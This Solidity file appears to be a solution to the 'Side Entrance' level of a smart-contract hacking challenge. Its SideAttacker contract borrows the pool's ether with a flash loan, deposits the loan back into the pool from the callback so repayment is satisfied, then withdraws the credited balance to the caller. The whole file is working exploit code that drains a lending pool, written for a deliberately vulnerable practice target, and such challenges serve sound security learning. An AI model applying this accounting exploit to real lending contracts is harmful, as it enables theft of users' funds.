pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/naive-receiver/NaiveReceiverLenderPool.sol";
import "contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideAttacker is IFlashLoanEtherReceiver{
    using Address for address payable;
    SideEntranceLenderPool _target;

    function execute() override external payable{
        //deposit in pool
        _target.deposit{value : msg.value}();
    }

    function exploit(SideEntranceLenderPool target) external {
        _target = target;
        //get loan and deposit does not transfer tokens
        _target.flashLoan(1000*10**18);
        _target.withdraw();
        payable(msg.sender).sendValue(1000*10**18);
    }

    receive() external payable{ }
}
